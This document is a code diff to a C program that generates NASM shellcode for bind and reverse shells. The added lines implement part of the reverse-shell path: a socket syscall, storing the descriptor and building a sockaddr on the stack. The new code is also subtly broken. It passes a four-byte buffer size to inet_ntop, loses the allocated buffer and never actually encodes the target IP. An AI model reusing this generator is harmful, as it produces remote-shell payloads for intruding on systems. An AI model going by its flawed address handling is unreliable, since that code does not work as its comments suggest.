@@ -17,7 +17,8 @@
 
 #define REG_PORT_MIN    1024            // lowest registered port
 #define DEFAULT_PATH    "temp.nasm"
-#define SKIP_PARAM      -1              // omit parameter to syscall
+#define SKIP_PARAM      (-1)              // omit parameter to syscall
+#define IPV4_STRLEN     (strlen("xxx.xxx.xxx.xxx") + 1)
 
 typedef enum {eax, ebx, ecx, edx, esi, esp} reg32_t;
 typedef enum {bind_shell, reverse_shell, misc_shell} shellcode_t;
@@ -93,7 +94,17 @@ static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family)
     }
     else
     {
-        dprintf(temp_fd, "\t; TODO: reverse shell will need IP parser\n");
+        char * addr_string = calloc(1, IPV4_STRLEN);
+        addr_string = inet_ntop(AF_INET, &ipv4, addr_string,
+sizeof(uint32_t));
+        if (NULL == addr_string)
+        {
+            perror("inet_ntop()");
+        }
+        dprintf(temp_fd, "\txor eax, eax\t\t; %s\n", addr_string);
+        // TODO(milnor): loop through the bytes and add if non-NULL..
+        dprintf(temp_fd, "\tpush eax\n");
+        free(addr_string);
     }
 
     endian_corrected = htons(port);
@@ -391,7 +402,17 @@ static void make_bind_shell(int temp_fd, uint16_t port)
 
 static void make_reverse_shell(int temp_fd, uint16_t port, struct in_addr * ipv4)
 {
-    // TODO: this
+    // socket(AF_INET, SOCK_STREAM, 0)
+    build_syscall3(SYS_socket, AF_INET, SOCK_STREAM, 0);
+    
+    // store socket fd
+    store_result(eax, ebx);
+
+    // build sockaddr on the stack
+    build_sockaddr(ipv4->s_addr, port, AF_INET);
+
+    // stack pointer into ecx
+    store_result(esp, ecx); 
     free(ipv4);
 }
 
